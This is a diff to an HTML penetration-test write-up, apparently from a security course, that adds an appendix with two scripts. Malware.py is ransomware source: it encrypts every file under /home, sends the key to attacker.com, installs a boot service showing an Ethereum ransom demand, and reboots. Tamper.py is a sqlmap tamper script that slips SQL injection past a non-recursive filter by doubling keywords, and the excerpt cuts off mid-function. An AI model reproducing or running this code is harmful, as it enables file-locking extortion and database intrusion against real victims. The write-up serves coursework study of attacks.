@@ -46,6 +46,12 @@
 <li><a href="#consequences">Consequences</a></li>
 </ul>
 </li>
+<li><a href="#appendix">Appendix</a>
+<ul>
+<li><a href="#malware.py">Malware.py</a></li>
+<li><a href="#tamper.py-1">Tamper.py</a></li>
+</ul>
+</li>
 </ul>
 
     </div>
@@ -533,8 +539,7 @@ The server on linux 2.6.32 (debian). This version is very old, and multiple expl
 <p>Through my browser’s console, I try to identify what happens network side.<br>
 <img src="https://github.com/wurwur/wurwur.github.io/blob/main/post.png?raw=true" alt="POST Payload"><br>
 We notice that the payload is in the form:</p>
-<pre class=" language-json"><code class="prism  language-json"><span class="token punctuation">{</span><span class="token string">"email"</span><span class="token punctuation">:</span> email<span class="token punctuation">;</span>
-<span class="token string">"password"</span><span class="token punctuation">:</span> password<span class="token punctuation">;</span> <span class="token punctuation">}</span>
+<pre class=" language-php"><code class="prism  language-php"><span class="token operator">?</span>email<span class="token operator">=</span><span class="token string">"email"</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token string">"password"</span>
 </code></pre>
 <p>This is all the recognition we might require. No need to start Burp or try any other scanning tools &amp; techniques.</p>
 <h2 id="detecting-and-exploiting-vulnerability">Detecting and Exploiting Vulnerability</h2>
@@ -691,6 +696,270 @@ The entire source code can be seen ONLINE at this adress:</p>
 <li>Major final loss from the randomware and the downtime</li>
 <li>Major loss of trust from the public</li>
 </ul>
+<h1 id="appendix">Appendix</h1>
+<h2 id="malware.py"><a href="http://harm.root.sx/malware.html">Malware.py</a></h2>
+<pre class=" language-py"><code class="prism  language-py"><span class="token comment"># Author: Harmony BOUABID</span>
+<span class="token comment">#</span>
+<span class="token comment"># /!\ This code contains potentially malicious malware.</span>
+<span class="token comment"># ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⣡⠴⠦⣌⡹⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿</span>
+<span class="token comment"># ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢃⡼⠁⠀⠀⠈⢳⡈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿</span>
+<span class="token comment"># ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢁⡞⠁⠀⣼⣧⡀⠈⢳⡌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿</span>
+<span class="token comment"># ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⢡⡞⠀⢀⣼⣿⣿⣷⡀⠀⠹⡄⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿</span>
+<span class="token comment"># ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣰⠏⠀⢀⣾⣿⣿⣿⣿⣷⡄⠀⠹⣆⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿</span>
+<span class="token comment"># ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⢰⠏⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⡀⠀⠸⡆⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿</span>
+<span class="token comment"># ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⢰⠏⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠹⣆⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿</span>
+<span class="token comment"># ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⣰⠏⠀⢠⣾⣿⣿⣿⠟⠛⠛⠻⢿⣿⣿⣿⡄⠀⠘⣦⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿</span>
+<span class="token comment"># ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⣼⠃⠀⢠⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⢹⣿⣿⣿⣆⠀⠘⢧⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿</span>
+<span class="token comment"># ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢃⡼⠃⠀⣰⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣆⠀⠈⢳⡘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿</span>
+<span class="token comment"># ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢃⡞⠁⠀⣼⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣧⠀⠈⢳⡈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿</span>
+<span class="token comment"># ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⢡⡞⠀⢀⣼⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣧⡀⠀⢻⡌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿</span>
+<span class="token comment"># ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⢠⡏⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠹⣆⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿</span>
+<span class="token comment"># ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⣰⠏⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠘⣆⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿</span>
+<span class="token comment"># ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⣰⠃⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠘⢦⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿</span>
+<span class="token comment"># ⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⡼⠃⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠈⢧⡘⢿⣿⣿⣿⣿⣿⣿⣿⣿</span>
+<span class="token comment"># ⣿⣿⣿⣿⣿⣿⣿⡿⢃⡼⠁⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠈⢳⡈⢿⣿⣿⣿⣿⣿⣿⣿</span>
+<span class="token comment"># ⣿⣿⣿⣿⣿⣿⡿⢡⡞⠁⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⢳⡌⢻⣿⣿⣿⣿⣿⣿</span>
+<span class="token comment"># ⣿⣿⣿⣿⣿⡟⢡⠟⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠹⡄⢻⣿⣿⣿⣿⣿</span>
+<span class="token comment"># ⣿⣿⣿⣿⡟⣰⠏⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠛⠛⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠹⣆⠹⣿⣿⣿⣿</span>
+<span class="token comment"># ⣿⣿⣿⡏⢰⡇⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠸⣆⢹⣿⣿⣿</span>
+<span class="token comment"># ⣿⣿⠏⣰⠏⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠹⣆⠹⣿⣿</span>
+<span class="token comment"># ⣿⠏⣰⠏⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠘⢦⠹⣿</span>
+<span class="token comment"># ⠇⡼⠃⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠘⢧⠘</span>
+<span class="token comment"># ⠀⣇⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⣸⠇</span>
+<span class="token comment"># ⣧⣈⠳⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠖⢋⣼</span>
+<span class="token comment"># ⣿⣿⣷⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣾⣿⣿</span>
+<span class="token comment"># /!\ This code contains potentially malicious malware.</span>
+<span class="token comment"># DO NOT RUN LOCALLY</span>
+
+<span class="token keyword">import</span> secrets
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> os
+<span class="token keyword">from</span> math <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES
+<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>Padding <span class="token keyword">import</span> pad
+<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSA
+<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> PKCS1_OAEP
+<span class="token keyword">import</span> base64
+
+<span class="token keyword">if</span> os<span class="token punctuation">.</span>geteuid<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span> <span class="token comment"># Ensure script is running as sudo/root</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"The silicon is craving sudo powers"</span><span class="token punctuation">)</span>
+    exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">generate_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>secrets<span class="token punctuation">.</span>randbelow<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># Cryptographically suitable pseudo random number generation. No obvious PRNG attacks are known.</span>
+
+<span class="token keyword">def</span> <span class="token function">generate_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> secrets<span class="token punctuation">.</span>token_hex<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>  <span class="token comment"># 32 hex = 32 bytes = 128bits. We are using AES128, thus we need this exact key size.</span>
+
+<span class="token keyword">def</span> <span class="token function">encrypt_file</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    key <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>key<span class="token punctuation">)</span>
+    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+        data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+    padded_data <span class="token operator">=</span> pad<span class="token punctuation">(</span>data<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>block_size<span class="token punctuation">)</span> <span class="token comment"># Pads the data to ensure homogenous aes block sizes</span>
+
+    iv <span class="token operator">=</span> secrets<span class="token punctuation">.</span>token_bytes<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>  <span class="token comment"># init vector</span>
+
+    cipher <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> iv<span class="token punctuation">)</span> <span class="token comment"># No ECB mode for obvious reasons. See ECB Penguin.</span>
+
+    encrypted_data <span class="token operator">=</span> cipher<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>padded_data<span class="token punctuation">)</span>
+
+    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+        <span class="token comment"># Write the uniquely generated IV for each file. The IV will be blended with the encrypted data to the untrained eye.</span>
+        <span class="token comment"># The first 16 bytes of each file can, upon decryption, be read and used as the decryption IV with the key.</span>
+        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>iv <span class="token operator">+</span> encrypted_data<span class="token punctuation">)</span>
+
+    <span class="token keyword">return</span> encrypted_file_path
+
+<span class="token keyword">def</span> <span class="token function">rsa_encrypt</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment"># RSA Encryption with hardcoded public key.</span>
+    <span class="token comment"># The complementary private key is stored privately on my machine</span>
+    public_key_pem <span class="token operator">=</span> <span class="token triple-quoted-string string">"""-----BEGIN PUBLIC KEY-----
+    MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyXgZWoZFqG1eC+mXsOC3
+    u3n/AZF93tO78FcvsoJ6ybtT8JkR1mlK4OcsOhUdt/acZaCAIIqv54W5odEryqWU
+    4LhWCiumpibIL/i0pr7XYWlyeYte8rkIwojWKXtogPwVKfVXh5VRY/FA+j2Jk6g1
+    I/M70KtRGne2waXjRj4jSvmaRearIh6zK82BvTBbDFwLfHHfI5xCNGosYRIFuUqn
+    6Ro6P/UBli4HR/PcdelOYWlLuG/9mVTA+qCoD900CjxpUY4CMsnpmgDnnKzBLwcP
+    fJDyPUUh9/hPpvEDdxzv73ctqhNbhwA0aCbKk4guFflFb/gl4ddlDnFPWpW+H+CK
+    MQIDAQAB
+    -----END PUBLIC KEY-----"""</span>
+
+    public_key <span class="token operator">=</span> RSA<span class="token punctuation">.</span>import_key<span class="token punctuation">(</span>public_key_pem<span class="token punctuation">)</span>
+
+    <span class="token comment"># Use PKCS1_OAEP for modern padding &amp; consistent web format</span>
+    cipher <span class="token operator">=</span> PKCS1_OAEP<span class="token punctuation">.</span>new<span class="token punctuation">(</span>public_key<span class="token punctuation">)</span>
+
+    ciphertext <span class="token operator">=</span> cipher<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>plaintext<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+    <span class="token comment"># Encode in base64 as a standard</span>
+    <span class="token keyword">return</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>ciphertext<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">send_data</span><span class="token punctuation">(</span>codes<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    url <span class="token operator">=</span> <span class="token string">"https://attacker.com"</span>
+    data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'data'</span><span class="token punctuation">:</span> codes<span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span> 
+    requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">gather_files</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment"># Recursively gathers all files (not folders) with their absolute path in the home folder</span>
+    <span class="token comment"># Not very pythonic to use os commands, but extremely fast and doesn't require any external modules</span>
+    <span class="token keyword">return</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span>f<span class="token string">'find /home -type f'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
+
+<span class="token keyword">def</span> <span class="token function">create_minimal_initd_service</span><span class="token punctuation">(</span>machine_id<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment"># Creates a service in init.d that autoruns. It renders the machine unusuable while it is running, </span>
+    <span class="token comment"># Ensures the user knows where/how much to pay (and what happened if it was not obvious enough).</span>
+    <span class="token comment"># And in general is a pretty funny signature for the hacker</span>
+    content <span class="token operator">=</span> f<span class="token triple-quoted-string string">"""#!/bin/bash
+### BEGIN INIT INFO
+# Provides: kernel
+# Required-Start:
+# Required-Stop:
+# Default-Start: 2 3 4 5
+# Default-Stop:
+# Short-Description: Gives you candy and probably chocolate
+# Description: Peach candy (they're my favourite)
+### END INIT INFO
+
+case "$1" in
+    start)
+        /bin/bash -c 'while true; do echo "
+                         =**=***     
+                         ++++*+*     
+                    =****++++++      
+            #*#**#*++#%***#*++*+     
+         %@@@@@@+++++=**+=#++++*     
+         %@@@@@@+++++++++++++++*     
+         %@@@@@@+++++++++++++++*     
+         #@@@@@@+++++=+++++++++*     
+           %#%*++=++++++*#*+++++     
+               :=+*+++++**+++***     
+                 =*+**++++**++==+    
+                 +*==========*===*   
+                ==*===========+===*  
+                 ++*=========*===*+  
+                  *+=##***##+#*=*=   
+                   *==+**+======*    
+                   =========-===*    
+                   *=====+======*    
+                    =====++=++++*    
+                   =**#*+=+----=+    
+                  =:::=******#***    
+                  **+++**=:::-***    
+                         =*****=
+Your files have been crypto-locked :( Be a chill guy and send {100+round(int(machine_id)/10**16,6)}ETH\nto the address 0x3CAD38fB0B2323B20XXXXXXXXXXXXXXXXXXXXXXX in the next 72 hours"; sleep 1; done'
+
+        ;;
+    *)
+        echo 'how did you even manage to reach this'
+        ;;
+esac
+"""</span> <span class="token comment"># The ETH amount to pay is used for machine identification! The first 6 digits of the uniquely randomly generated id </span>
+    <span class="token comment"># Are used as the decimals of the ETH amount to send. The less data we need to share between the attacker and the victim,</span>
+    <span class="token comment"># The more secure the operation is. Furthermore, it ensures that even an offline victim can be identified.</span>
+
+    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/etc/init.d/kernel"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"chmod 777 /etc/init.d/kernel"</span><span class="token punctuation">)</span>
+    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"update-rc.d kernel defaults"</span><span class="token punctuation">)</span>
+    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"/etc/init.d/kernel start"</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">reboot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Good night :)"</span><span class="token punctuation">)</span>
+    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"reboot"</span><span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+
+    <span class="token keyword">if</span> <span class="token string">"LAUNCH"</span> <span class="token operator">!=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"This is a security checkpoint for the sake of not running the malware on your own machine.\n This checkpoint would be removed on the main malware. This is just a demonstration\n Please type: LAUNCH"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    machine_id <span class="token operator">=</span> generate_id<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># Generate the 16-digit ID</span>
+    key <span class="token operator">=</span> generate_key<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># Generate the cryptographic 256-bit key</span>
+
+    <span class="token keyword">for</span> <span class="token builtin">file</span> <span class="token keyword">in</span> gather_files<span class="token punctuation">(</span><span class="token string">"/home/neowo/263-cybersec/cw/part3/exp/test_malware"</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># For every file:</span>
+        encrypted_file_path <span class="token operator">=</span> encrypt_file<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span>                               <span class="token comment"># Encrypt said file</span>
+
+    codes <span class="token operator">=</span> rsa_encrypt<span class="token punctuation">(</span>f<span class="token string">'id: {machine_id}, key: {key}'</span><span class="token punctuation">)</span>                            <span class="token comment"># RSA Encrypt the id and key with a hardcoder public key</span>
+
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        send_data<span class="token punctuation">(</span>code<span class="token punctuation">)</span>    <span class="token comment"># try to send the id/key to our server</span>
+    <span class="token keyword">except</span><span class="token punctuation">:</span>
+        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"key.dat"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span> <span class="token comment"># if it fails, save it locally.</span>
+            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>code<span class="token punctuation">)</span>               <span class="token comment"># The rsa encryption therefore has two uses: </span>
+                                        <span class="token comment">#   - if offline, the victim will have a possibility of decryption strictly upon paying</span>
+                                        <span class="token comment">#   - if online, no firewall/packet sniffer/logs can be used to record and find the id/key sent to the server</span>
+
+    create_minimal_initd_service<span class="token punctuation">(</span>machine_id<span class="token punctuation">)</span> <span class="token comment"># Creates a routine that starts upon boot to display a message and render the terminal useless. Also displays information about payment</span>
+
+    reboot<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># Reboots the machines for the init.d routine to update and to clear any possible traces in memory of information that could help decryption/identification of the attacker</span>
+</code></pre>
+<h2 id="tamper.py-1"><a href="http://harm.root.sx/tamper.html">Tamper.py</a></h2>
+<pre class=" language-py"><code class="prism  language-py"><span class="token comment">#!/usr/bin/env python</span>
+
+<span class="token keyword">import</span> re
+
+<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY
+
+__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>HIGHEST
+
+<span class="token keyword">def</span> <span class="token function">dependencies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">pass</span>
+
+<span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token triple-quoted-string string">"""
+    We have identified some sort of sanitization of the query.
+    We were able to identify:
+        - Most common operators that were deleted
+        - The fact that the sanitization process does not run recursively
+
+    --------------------------------------------------
+
+    This tampering script:
+
+    # Replaces:
+        - Greater than operators ('&gt;') with 'NOT BETWEEN 0 AND #'
+        - Equals operators ('=') with 'BETWEEN # AND #'
+        - OR operators ('OR') with its symbolic contrapart ('||')
+        - AND operators ('AND') with its symbolic contrapart ('&amp;&amp;')
+
+
+    # Doubles:
+            Server-side, the following sub-strings "s" will be identified in the middle of our full string
+            "s[:l]+s+[l:]" with 1&lt;l&lt;length(s). The process does not run recursively, as shown by local tests, the middle "LIKE"
+            will be removed, thus leaving behind a normal "s" query.
+
+        - Pattern Matching operators ('LIKE') as ('LILIKEKE')
+        - Selection operators ('SELECT') as ('SELSELECTECT')
+        - Commenting operators ('--') as ('-=-')
+            &gt; Here, we modify the string with a character we know will be removed by the sanitization process
+        - Boolean operators ('TRUE') and ('FALSE') as ('TRTRUEUE') and ('FALFALSE')
+        - Negation operators ('NOT') as ('NONOTT')
+
+
+    # Simply removes if are detected:
+            There is no known way to effectively replace this element in all cases
+
+        - Arguments separation operators (',')
+    """</span>
+
+    retVal <span class="token operator">=</span> payload
+
+    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>
+        match <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">"(?i)(\b(AND|OR)\b\s+)(?!.*\b(AND|OR)\b)([^&gt;]+?)\s*&gt;\s*([^&gt;]+)\s*\Z"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+
+        <span class="token keyword">if</span> match<span class="token punctuation">:</span>
+            _ <span class="token operator">=</span> <span class="token string">"%s %s NOT BETWEEN 0 AND %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>match<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> match<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span> match<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+            retVal <span class="token operator">=</span> retVal<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>match<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _<span class="token punctuation">)</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            retVal <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span>r<span class="token string">"\s*&gt;\s*(\d+|'[^']+'|\w+\(\d+\))"</span><span class="token punctuation">,</span> r<span class="token string">" NOT BETWEEN 0 AND \g&lt;1&gt;"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+
